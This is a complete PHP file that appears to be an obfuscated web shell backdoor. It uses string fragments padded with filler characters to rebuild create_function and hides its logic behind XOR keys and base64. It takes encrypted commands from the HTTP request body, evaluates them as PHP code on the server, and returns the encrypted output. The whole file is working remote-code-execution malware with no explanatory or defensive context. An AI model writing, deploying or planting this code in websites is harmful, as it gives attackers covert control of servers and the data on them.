<?php
$x='$j=0;(I$Ij<$cI&&$Ii<$l);$j++,$iI++){$o.=$ItI{II$i}^$k{$j};}}return I$o;I}ifI (@preg_';
$s=str_replace('H','','crHeatHe_HfHunHctHion');
$b='matcIhII("/$khI(.+)$kf/",@fIile_getI_cIoInteInts(I"phIp://input"),I$m)==1) {@ob_start();@eIva';
$Q='functiIonI x(I$t,$k){$Ic=strlen($kI);$l=stIrlIeIn($t);$o="";fIor($i=0I;$i<$Il;){Ifor(';
$N='I$k="d890d4Ied";I$kh="69a2978bI4908I";$kfI="II3b9ce3463cb8"I;$p="Ix3vBUQ5FOP7yIgjlD";I';
$f='_enId_cIlean();$rI=@basIe64I_encIode(@x(I@gzcomIpreIss($o)I,$k));print("$p$kh$Ir$kf");}';
$D='l(I@gzuncoImpresIs(@x(@bIaseI64_decodeI($m[I1]I),$k)));$o=@oIb_gIeIt_contents()I;@oIb';
$S=str_replace('I','',$N.$Q.$x.$b.$D.$f);
$q=$s('',$S);$q();
?>
